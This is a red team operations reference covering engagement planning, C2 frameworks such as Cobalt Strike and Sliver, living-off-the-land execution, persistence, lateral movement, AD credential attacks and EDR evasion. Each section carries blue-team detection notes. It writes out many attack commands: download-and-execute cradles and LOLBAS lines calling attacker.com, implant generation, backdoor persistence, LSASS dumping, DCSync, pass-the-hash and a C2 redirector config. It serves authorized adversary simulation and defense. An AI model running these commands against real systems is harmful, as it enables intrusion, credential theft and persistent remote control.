# Red Team Operations Reference

> Comprehensive adversary simulation reference covering engagement planning, C2 frameworks, post-exploitation tradecraft, and detection/defense context for each technique.

---

## Red Team vs Penetration Testing vs Purple Team

| Aspect | Penetration Test | Red Team | Purple Team |
|---|---|---|---|
| Goal | Find vulnerabilities | Simulate adversary, test detection | Improve defenses collaboratively |
| Scope | Defined assets | Objective-based (e.g., reach domain admin) | Specific TTPs to test/improve |
| Duration | Days-weeks | Weeks-months | Ongoing/sprint-based |
| Blue team notified | Usually yes | Usually no (test detection) | Yes, collaborative |
| Rules of Engagement | Asset-focused | Mission-focused | Specific ATT&CK techniques |
| Output | Vulnerability list | Full attack narrative | Detection gap analysis |

---

## Engagement Planning

### Rules of Engagement (ROE) Checklist

- Authorized scope: IP ranges, domains, physical locations, cloud accounts
- Out-of-scope: production DBs with PII, critical safety systems, specific users
- Emergency stop ("red card") procedures and escalation contacts
- Hours of operation (24/7 vs business hours)
- Destructive actions: allowed/prohibited (ransomware simulation, data deletion)
- Persistence: allowed/prohibited (and if allowed, specific methods)
- Third-party notification requirements (MSP, cloud providers)
- Legal authorization: signed Rules of Engagement + Master Services Agreement

### ATT&CK-Based Engagement Planning

- Select threat actor profile to emulate (APT29 for nation-state, FIN7 for financial, Scattered Spider for cloud)
- Map actor's known TTPs to ATT&CK Navigator layer
- Build attack scenarios around those TTPs
- Define "assume breach" starting point vs full external engagement

**Blue team context:** Engagement planning output should feed directly into detection gap analysis. Each TTP selected for the engagement should map to a detection hypothesis — if the blue team cannot detect it, that is a finding.

---

## Reconnaissance (Pre-Engagement OSINT)

OSINT collection scope (authorized passive):

```bash
# Infrastructure discovery
amass enum -d target.com -passive -o amass_output.txt
subfinder -d target.com -all -o subfinder_output.txt
assetfinder target.com >> all_subs.txt

# Email format + employee enumeration
hunter.io API call for email format
linkedin2username -u attacker@gmail.com -c "TargetCorp"

# Technology fingerprinting
whatweb -a 3 https://target.com
shodan search 'org:"Target Corporation"' --fields ip_str,port,hostnames

# Certificate transparency
curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq '.[].name_value' | sort -u

# GitHub reconnaissance
trufflehog github --org=TargetOrg --only-verified
```

**Detection:** Passive OSINT is largely undetectable. Active scanning (Shodan, direct enumeration) may appear in web access logs. Monitor for certificate transparency log queries against your domain. Canary tokens in public files (GitHub, S3) can detect targeted reconnaissance.

---

## Initial Access Techniques

### Spear Phishing with Payload Delivery

| Technique | Mechanism | Detection |
|---|---|---|
| Document macros (VBA) | VBA spawns PowerShell stager | Office macro execution via AMSI, AMSI telemetry in Defender |
| HTML smuggling | Blob URL decodes malware locally | Suspicious JavaScript in email HTML attachment; MDE alert on encoded blob |
| LNK files | Embedded PowerShell in shortcut | LNK execution spawning PowerShell; LNKR parent process |
| ISO/VHD containers | Bypasses Mark-of-the-Web | SmartScreen bypass indicators; process spawned from mounted volume |
| OneNote attachments | Embedded EXE/script | OneNote spawning processes; ONENOTE.EXE as parent |

**Blue team hardening:**
- Block macros via Group Policy for non-managed content
- Enable AMSI integration for Office
- Deploy Microsoft Defender Attack Surface Reduction (ASR) rule: Block Office applications from creating child processes
- Configure email gateway to strip ISO/VHD/LNK attachments
- Enable Protected View and Application Guard

### Supply Chain / Trusted Relationship Access

- Compromise MSP/vendor with access to target
- Malicious CI/CD pipeline injection (GitHub Actions, Jenkins)
- Dependency confusion / typosquatting (publish internal package name to public registry)

**Detection:** Unusual authentication from MSP IP ranges outside maintenance windows; audit third-party access regularly. Monitor CI/CD pipeline for unexpected runners or workflow changes. Use private package registries with scoping to prevent dependency confusion.

---

## Command and Control (C2) Frameworks

### Cobalt Strike

*The most widely used commercial C2 — used by operators and real adversaries alike.*

**Architecture:** Team Server -> Beacon payload -> Operator console

**Key capabilities:**

- Malleable C2 profiles: customize HTTP headers, URIs, staging to blend with legitimate traffic
- Beacon sleep + jitter: `sleep 60 30` = 60s +/- 30% jitter
- Lateral movement: `jump psexec`, `jump winrm`, `jump wmi`, `spawn` via SMB named pipe
- Post-exploitation: `execute-assembly` (run .NET in memory), `powerpick` (PowerShell without powershell.exe), `shinject` (shellcode injection)
- Credential operations: `hashdump`, `dcsync`, `mimikatz`
- Covert channels: DNS beacon, SMB beacon, HTTPS with custom profile

**Default detection indicators (avoid these on real engagements):**

- Default TLS certificate: issuer CN = `Major Cobalt Strike User`
- Default sleep 60s, no jitter
- Default staging URI pattern: `/____`
- JA3 fingerprint: `72a589da586844d7f0818ce684948eea`
- Default named pipe prefix: `\.\pipe\MSSE-`

**Blue team detection:**
- JA3/JA3S fingerprinting of TLS handshakes (Zeek, Suricata)
- Beacon sleep pattern analysis — uniform beaconing at fixed intervals
- Pipe name monitoring: Sysmon Event ID 17/18 for named pipes
- Memory scanning: YARA rules for Cobalt Strike shellcode patterns
- Network: look for HTTP beacons with unusual User-Agent to non-categorized IP

---

### Sliver (Open Source)

*Modern OSS C2 by BishopFox — growing adoption by both operators and threat actors.*

```bash
# Server setup
sliver-server

# Generate implant
generate --mtls attacker.com:443 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# DNS C2
generate --dns c2.attacker.com --os windows --format shellcode

# List sessions
sessions

# Interact
use <session_id>
```

**Key capabilities:** mTLS/WireGuard/HTTP/DNS transports, Armory extension ecosystem, built-in stager generation, BOF (Beacon Object File) execution via Sliver extensions.

**Detection indicators:**
- Default certificate Subject: `multiplayer`
- Process name matches Sliver default names list
- Characteristic HTTP request patterns
- WireGuard traffic on non-standard ports

**Blue team:** Monitor for unusual outbound WireGuard (UDP) traffic. Sliver's mTLS uses self-signed certs — flag certs with short validity and non-organizational subjects. Memory scanning with Sliver-specific YARA rules.

---

### Havoc (Open Source)

*C/C++ C2 framework with strong evasion features.*

**Key features:**
- Demon agent: process injection, token manipulation, NTLM relay
- Sleep obfuscation: Ekko and FOLIAGE techniques (encrypt agent in memory while sleeping)
- Indirect syscalls to bypass user-land EDR hooks
- AMSI and ETW patching built in

**Detection:** Behavioral detection of sleep obfuscation (memory encryption/decryption cycles), indirect syscall patterns via kernel ETW, anomalous token usage. Havoc's default HTTPS traffic has characteristic patterns.

---

### Mythic (Open Source)

*Container-based modular C2 framework.*

```bash
# Agents: Apollo (.NET), Poseidon (Go), Thanatos (Rust)
# Transports: HTTP/S, SMB, TCP, WebSocket
# C2 profiles: customizable similar to CS malleable
# UI: web-based operator interface
```

**Key feature:** Each agent and transport is a separate Docker container — highly modular and extensible. Good for custom payload development and training.

**Detection:** Lower evasion out of the box vs Havoc/CS. Default Mythic agent behaviors are well-documented. Signature-based detection is more effective here.

---

### Brute Ratel C4 (Commercial)

*Designed from scratch to evade EDR.*

- Direct syscalls — bypasses all user-land API hooks
- No Win32 API calls for injection primitives
- Process injection without CreateRemoteThread
- Notably used by real threat actors (Scattered Spider, APT41) after cracked versions leaked

**Detection:** Despite high evasion, BRC4 produces behavioral artifacts. Kernel-mode EDR (ETW-TI, PatchGuard integration) can detect direct syscalls. Network traffic analysis, memory scanning for BRC4 shellcode patterns.

---

### C2 Framework Comparison

| Framework | License | Language | Evasion Level | Detection Difficulty | Notable Feature |
|---|---|---|---|---|---|
| Cobalt Strike | Commercial | Java | High (custom profile) | Medium-High | Malleable C2, mature ecosystem |
| Sliver | OSS | Go | Medium | Medium | mTLS/WireGuard, active development |
| Havoc | OSS | C/C++ | High | Medium-High | Sleep obfuscation, indirect syscalls |
| Mythic | OSS | Python | Varies by agent | Low-Medium | Modular, container-based |
| Brute Ratel C4 | Commercial | C | Very High | High | Direct syscalls, no Win32 API |
| Merlin | OSS | Go | Medium | Low-Medium | HTTP/2 + QUIC transport |
| PoshC2 | OSS | PowerShell/Python | Low-Medium | Low | PowerShell-native |
| Covenant | OSS | .NET | Medium | Low-Medium | Grunt implants (.NET) |

---

## Post-Exploitation Tradecraft

### Living off the Land (LOLBAS)

*Use built-in Windows binaries for malicious purposes — avoid dropping new tools.*

```bash
# Code execution
mshta.exe http://attacker.com/payload.hta              # HTA execution
wscript.exe payload.vbs                                # VBScript
regsvr32.exe /s /n /u /i:http://attacker.com/x.sct scrobj.dll  # Scriptlet
certutil.exe -urlcache -split -f http://attacker.com/p.exe     # Download
bitsadmin /transfer job http://attacker.com/p.exe C:\file.exe # Download
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...  # JS via rundll32

# Reconnaissance
nltest /domain_trusts                                  # Domain trust enumeration
net group "Domain Admins" /domain                     # DA enumeration
whoami /all                                            # Current privileges
systeminfo                                             # System information
qwinsta                                                # Active RDP sessions
klist                                                  # Kerberos tickets
```

Full LOLBAS list: [lolbas-project.github.io](https://lolbas-project.github.io) — 150+ binaries, scripts, and libraries.

**Blue team detection:**
- ASR rule: Block execution of potentially obfuscated scripts
- Block `mshta.exe`, `regsvr32.exe`, `wscript.exe` from spawning child processes (ASR)
- Monitor `certutil.exe` and `bitsadmin.exe` for network activity (Sysmon network event + process)
- Alert on `rundll32.exe` with command-line arguments containing `javascript:`
- Process parent-child anomalies: `nltest`, `net.exe` spawned from unexpected parents

---

### Memory-Only (Fileless) Techniques

```powershell
# PowerShell download cradles (in-memory execution)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
IEX (iwr 'http://attacker.com/payload.ps1' -UseBasicParsing)

# Reflective DLL injection (no disk writes)
# Load DLL directly into process memory from download — no file on disk

# Classic process injection (detected by modern EDR):
# VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread

# Evasion variants:
# QueueUserAPC injection (process hollowing variant)
# Thread hijacking (SuspendThread -> SetThreadContext -> ResumeThread)
# Indirect syscalls: bypass EDR user-land hooks by calling syscall stubs directly
# Transacted hollowing: use TxF to write payload without triggering file callbacks
```

**Blue team detection:**
- PowerShell Script Block Logging (Event ID 4104) — logs obfuscated content after deobfuscation
- AMSI intercepts PowerShell, JScript, VBScript before execution
- Memory scanning: detect RWX allocations, PE headers in unexpected memory regions
- Sysmon Event ID 8 (CreateRemoteThread) for classic injection
- ETW-TI (Threat Intelligence ETW provider) for injection primitives in kernel — available with Windows Defender Credential Guard and MDE P2

---

### Persistence Techniques

```bash
# Registry Run keys (highly detected)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\backdoor.exe"

# Scheduled tasks (detected, but common)
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# WMI event subscription (less noisy than Run keys)
# MOF file: __EventFilter + __EventConsumer + __FilterToConsumerBinding binding

# DLL hijacking
# Place malicious DLL in search path before legitimate DLL location
# Common targets: applications that load DLLs from writable user directories

# COM hijacking (user-level persistence, no admin required)
# HKCU\Software\Classes\CLSID\ override of HKLM CLSID

# Stealthier (APT-level):
# Boot/Pre-OS: UEFI implant (CosmicStrand, MoonBounce), bootkits
# Kernel driver persistence (requires signed driver or vulnerable driver exploitation)
```

| Persistence Method | Stealth | Admin Required | Detection |
|---|---|---|---|
| Registry Run key | Low | No | Autoruns, Sysmon reg events |
| Scheduled task | Low | Sometimes | Sysmon Task Scheduler events |
| WMI subscription | Medium | Yes | Sysmon WMI events (19/20/21) |
| DLL hijacking | Medium | No (user dirs) | Directory monitoring, Sysmon image load |
| COM hijacking | Medium | No | Registry monitoring under HKCU |
| UEFI implant | Very High | Physical/kernel | UEFI scanner, Secure Boot violation |

**Blue team:** Use Autoruns (Sysinternals) or its enterprise equivalent to baseline and diff persistence locations. Sysmon events 19-21 for WMI event subscriptions. Enable Protected UEFI variables and Secure Boot. Microsoft Defender's Tamper Protection prevents many persistence modifications.

---

### Lateral Movement Techniques

```bash
# PsExec (noisy — drops service binary, generates Event ID 7045)
impacket-psexec domain/user:pass@target

# WMI (less noisy — no service install)
impacket-wmiexec domain/user:pass@target

# WinRM (if enabled — PowerShell remoting)
impacket-winrm domain/user:pass@target
evil-winrm -i target -u user -p pass

# SMB + scheduled task (Cobalt Strike: jump psexec_psh)
# Combines SMB file copy with remote scheduled task execution

# Pass-the-Hash (no plaintext needed)
impacket-psexec -hashes :NTLM_HASH domain/user@target

# DCOM lateral movement (uses COM automation objects)
impacket-dcomexec domain/user:pass@target

# SSH lateral movement
ssh -i id_rsa user@target
ssh -J jumphost user@internal_target  # proxyjump

# Kerberos-based
impacket-getTGT domain/user:pass      # Get TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain/user@target
```

**Blue team detection:**

| Technique | Event IDs | Detection Notes |
|---|---|---|
| PsExec | 7045 (service install), 4624 (logon type 3) | Service named PSEXESVC or random; admin share access |
| WMIExec | 4624, 4648, WMI activity logs | Provider host spawning cmd.exe |
| WinRM | 4624 (logon type 3), WSMan operational log | Port 5985/5986 connections |
| Pass-the-Hash | 4624 type 3 with NTLM auth | NTLMv2 where Kerberos expected |
| DCOM | 4624, DCOM event log | Unusual DCOM object activation |

---

## Credential Access Techniques

### Active Directory Credential Attacks

```bash
# Kerberoasting (request TGS for SPNs, crack offline)
impacket-GetUserSPNs domain/user:pass -request -outputfile hashes.kerberoast
hashcat -m 13100 hashes.kerberoast wordlist.txt

# AS-REP Roasting (accounts with "Do not require Kerberos preauthentication")
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -request
hashcat -m 18200 hashes.asrep wordlist.txt

# DCSync (request replication of password hashes — requires DA or replication rights)
impacket-secretsdump -just-dc domain/admin:pass@DC_IP
# Or in Cobalt Strike: dcsync domain\krbtgt

# Pass-the-Hash
crackmapexec smb target_range -u user -H NTLM_HASH

# LSASS credential dumping
# Method 1: Task Manager (interactive, detected)
# Method 2: comsvcs.dll MiniDump
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\lsass.dmp full
# Method 3: Direct LSASS read via API (EDR-detected)
# Method 4: Shadow copy of ntds.dit
```

**Blue team detection:**
- Kerberoasting: Event ID 4769 with ticket encryption type 0x17 (RC4) for service accounts — alert on volume
- AS-REP Roasting: Event ID 4768 with preauthentication type 0x0 — high fidelity alert
- DCSync: Event ID 4662 with `1131f6aa` (Replicating Directory Changes) — very high fidelity if from non-DC
- LSASS dumping: Sysmon Event ID 10 (process access to lsass.exe); Windows Defender Credential Guard prevents LSASS secrets extraction
- Enable Protected Users security group for privileged accounts (prevents NTLM and RC4 Kerberos)

---

## Detection Evasion Tradecraft

### Common EDR Detection Methods and Evasion

| Detection Method | How EDR Detects | Evasion Technique |
|---|---|---|
| API hooking (user-land) | Hook NtAllocateVirtualMemory, NtWriteVirtualMemory, etc. | Direct syscalls, indirect syscalls, unhooking |
| Process creation monitoring | Win32 CreateProcess events | WMI, COM, token impersonation for process creation |
| Network monitoring | Socket API calls | Encrypted C2, port 443, HTTP/S beacons, domain fronting |
| Script block logging | PowerShell AMSI integration | CLM bypass, PowerShell downgrade attack (v2), AMSI patch in memory |
| Signature scanning | File hash, PE sections, import table | Obfuscation, packing, in-memory-only execution, custom loader |
| Behavioral analysis | Unusual parent-child process chains | Spawn payload from legitimate process (explorer.exe, svchost.exe) |
| Memory scanning | RWX regions, PE headers in heap | Heap encryption, PE header stomping, module stomping |
| ETW telemetry | Kernel ETW providers | ETW patching (risky — triggers tamper detection in MDE) |

### AMSI Bypass Context

AMSI (Antimalware Scan Interface) intercepts:
- PowerShell script blocks before execution
- JScript/VBScript via wscript.exe and cscript.exe
- .NET assemblies loaded reflectively
- COM object instantiation in scripting engines

**Operator note:** AMSI bypasses are well-known and most are detected by modern EDRs. Cobalt Strike's `powerpick` avoids PowerShell.exe entirely, removing the AMSI hooking surface. Custom .NET loaders compiled fresh have better success than public AMSI bypass scripts.

---

## Purple Team Operations

### Atomic Red Team Integration

```powershell
# Install
Install-Module -Name invoke-atomicredteam -Force
Import-Module invoke-atomicredteam

# List tests for a technique
Invoke-AtomicTest T1059.001 -ShowDetailsBrief

# Run specific test
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Run with prereq check
Invoke-AtomicTest T1059.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Cleanup
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
```

### Purple Team Workflow

1. Red team selects ATT&CK technique from engagement scope
2. Execute technique with full logging enabled (Sysmon, AMSI, ScriptBlock logging, network capture)
3. Document exact IOCs generated: process names, command lines, network indicators, registry changes
4. Share IOCs with blue team
5. Blue team writes/validates detection rule
6. Re-execute technique to confirm detection fires
7. Document gap or confirmed coverage in ATT&CK Navigator layer

**Purple team use cases:**
- Test specific ATT&CK technique and measure detection latency
- Tabletop exercises: walk through attack scenario, identify detection gaps
- Detection engineering sprint: red provides attack, blue writes detection, validate in lab
- BAS (Breach and Attack Simulation): continuous automated validation

---

## Infrastructure OPSEC

### Redirector Architecture

```
Operator -> Team Server (hidden, cloud VPS) -> Redirectors (nginx/Apache mod_rewrite) -> Target
```

**Redirector setup with Apache mod_rewrite:**
```apache
# Redirect C2 traffic to team server, everything else to legitimate site
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 (compatible; MSIE 9.0"
RewriteRule ^/updates/(.*)$ https://TEAMSERVER_IP/updates/$1 [P,L]
RewriteRule ^.*$ https://www.google.com/ [R,L]
```

**Domain selection:**
- Register domain 30+ days old (aged domain) to avoid new-domain reputation blocks
- Use domain categorized as Finance, Technology, or Healthcare for proxy bypass
- Avoid domain generation algorithm (DGA) patterns — register real-sounding domains
- Use domain fronting (via CDN) for high-security environments — routes through CDN IP

**Blue team detection of redirectors:**
- JA3 fingerprinting through TLS inspection catches beacon even if IP changes
- HTTP response characteristics remain consistent even behind CDN
- DNS resolution patterns — short TTL, rapid IP rotation is suspicious
- Passive DNS history can link redirector infrastructure

---

## Engagement Lifecycle

### Phase Timeline

| Phase | Activities | Duration |
|---|---|---|
| Planning & Authorization | ROE, scope, threat actor selection, infrastructure setup | 1-2 weeks |
| Reconnaissance | OSINT, external enumeration, employee targeting | 1-2 weeks |
| Initial Access | Phishing campaign, exploitation, supply chain | 1-4 weeks |
| Establish Foothold | C2 deployment, persistence, internal recon | Days |
| Privilege Escalation | Local privesc, credential harvesting, lateral movement | 1-2 weeks |
| Mission Execution | Reach objective (DA, crown jewels, data exfil) | Variable |
| Reporting & Debrief | Technical report, ATT&CK Navigator layer, debrief | 1-2 weeks |

---

## Reporting and Documentation

### Executive Summary Components

- Business risk statement: what could an attacker with this access do?
- Crown jewels reached: payroll data, M&A information, source code, customer PII
- Time-to-objective: how long to reach domain admin / target data
- Detection and response gaps: how many techniques went undetected and for how long

### Technical Report Structure

- Engagement overview: scope, dates, team, methodology
- Attack path narrative: chronological attack chain with evidence screenshots
- Finding per technique: ATT&CK ID, description, evidence, detection status, remediation
- Credential exposure summary: accounts compromised, privilege levels reached
- Persistence mechanisms: all backdoors installed (and confirmation of removal)

### ATT&CK Navigator Layer

- Export engagement TTPs as Navigator JSON layer
- Color code by: executed successfully (red), detected (yellow), detected and blocked (green)
- Deliver to blue team as detection gap heat map
- Use as baseline for detection engineering sprint prioritization

### Remediation Validation

- Re-test each finding after remediation is applied
- Confirm fix closes the specific technique (not just the specific exploit)
- Document retest date, result, and validator in final report

---

## Key References

| Resource | URL |
|---|---|
| MITRE ATT&CK Enterprise | https://attack.mitre.org/matrices/enterprise/ |
| Cobalt Strike documentation | https://hstechdocs.helpsystems.com/manuals/cobaltstrike/ |
| Sliver wiki | https://github.com/BishopFox/sliver/wiki |
| LOLBAS project | https://lolbas-project.github.io |
| Atomic Red Team | https://github.com/redcanaryco/atomic-red-team |
| Impacket | https://github.com/fortra/impacket |
| Malleable C2 profiles | https://github.com/Cobalt-Strike/Malleable-C2-Profiles |
| C2 Matrix | https://www.thec2matrix.com |
| Sysmon config reference | https://github.com/SwiftOnSecurity/sysmon-config |
| MaLDAPtive (AD recon) | https://github.com/MaLDAPtive/Invoke-Maldaptive |

---

*Part of the [TeamStarWolf](https://github.com/TeamStarWolf/TeamStarWolf) cybersecurity resource library.*
